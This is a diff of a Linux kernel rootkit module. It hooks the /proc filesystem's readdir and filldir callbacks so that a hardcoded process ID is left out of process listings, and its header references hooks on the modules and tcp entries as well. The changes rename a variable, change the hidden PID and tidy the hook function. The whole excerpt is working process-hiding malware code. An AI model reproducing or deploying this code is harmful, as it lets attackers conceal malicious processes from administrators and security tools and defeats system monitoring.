@@ -22,7 +22,7 @@ struct proc_dir_entry *modules, *root, *handler, *tcp;
 static struct file_operations proc_fops;
 const struct file_operations *originalProc = 0, *modules_originalProc = 0, *tcp_originalProc = 0;
 
-filldir_t proc_filldir = NULL;
+filldir_t originalProcFillDir = NULL;
 
 unsigned hidden_pid_count = 0;
 void hook_proc(struct proc_dir_entry *root);
@@ -82,27 +82,24 @@ void hook_proc(struct proc_dir_entry *root) {
 
 
 int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
-	char *tohidePID = "2668"; //TODO: make it possible to specify the pid to hide in an easier way...
+	char *tohidePID = "2314"; //TODO: make it possible to specify the pid to hide in an easier way...
 	
-	//printk(KERN_INFO "proc entry: %s\n", buffer);
 	int doStringsMatch = (strcmp(buffer, tohidePID) == 0);
 	
 	int result;
 	if (doStringsMatch) {
 		result = 0;
 	} else {
-		result = proc_filldir(a, buffer, c, d, e, f); /// this may be null... / there may be issues if accessed concurrently... :(....
-		//sproc_filldir = NULL; //TODO: PERHAPS REMOVE THIS _ IT MAY BE WRONG>.
+		result = originalProcFillDir(a, buffer, c, d, e, f);
 	}
 	return result;
 }
 
 
-static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir) {
-	proc_filldir = fdir;
+static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir) {	
+	originalProcFillDir = fdir;
 	
-	int result = originalProc->readdir(fp, buf, fake_proc_fill_dir);
-	return result;
+	return originalProc->readdir(fp, buf, fake_proc_fill_dir);
 }
 void processHider_exit(void) {
 	if (originalProc != NULL) {
